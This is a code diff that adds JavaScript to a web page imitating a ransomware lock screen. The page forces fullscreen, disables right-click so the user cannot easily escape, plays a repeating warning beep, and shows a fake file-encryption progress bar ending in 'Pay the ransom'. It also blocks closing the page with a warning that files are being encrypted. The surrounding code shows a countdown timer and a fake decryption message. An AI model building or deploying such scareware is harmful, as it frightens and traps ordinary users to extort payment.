@@ -106,6 +106,44 @@
 
         const timerInterval = setInterval(updateTimer, 1000);
 
+        ////
+        document.addEventListener("DOMContentLoaded", function() {
+        // Make the page full screen to simulate a locked system
+        document.documentElement.requestFullscreen();
+
+        // Disable right-click to prevent user from easily escaping
+        document.addEventListener("contextmenu", event => event.preventDefault());
+
+        // Play warning sound
+        let audio = new Audio('https://www.soundjay.com/button/beep-07.wav');
+        setInterval(() => audio.play(), 5000); // Play sound every 5 seconds
+
+        // Simulate encryption by changing text dynamically
+        let fakeEncryptionText = document.createElement("p");
+        fakeEncryptionText.style.color = "yellow";
+        fakeEncryptionText.style.fontSize = "1.5rem";
+        document.body.appendChild(fakeEncryptionText);
+
+        let fakeEncryptionProgress = 0;
+        let fakeEncryptionInterval = setInterval(() => {
+            if (fakeEncryptionProgress >= 100) {
+                clearInterval(fakeEncryptionInterval);
+                fakeEncryptionText.innerText = "Encryption complete. Pay the ransom.";
+            } else {
+                fakeEncryptionProgress += 10;
+                fakeEncryptionText.innerText = `Encrypting files... ${fakeEncryptionProgress}%`;
+            }
+        }, 2000);
+    });
+
+    // Prevent user from closing the page
+    window.onbeforeunload = function() {
+        return "Your files are being encrypted. Are you sure you want to leave?";
+    };
+
+
+
+
         // Simulate Real-Time Updates
         setTimeout(() => {
             document.getElementById('timer').textContent = "Payment Received! Decrypting files...";
